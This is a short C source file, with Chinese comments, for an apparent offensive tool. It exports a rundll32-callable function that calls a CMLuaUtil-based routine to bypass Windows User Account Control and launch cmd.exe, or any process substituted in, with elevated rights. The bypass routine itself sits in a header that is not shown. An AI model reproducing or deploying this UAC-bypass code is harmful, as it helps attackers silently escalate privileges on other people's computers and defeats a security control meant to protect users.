#include "BypassUAC.h"

//导出函数给rundll32.exe调用执行
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe"); //绕过UAC启动进程,这里替换成想要启动的进程路径
}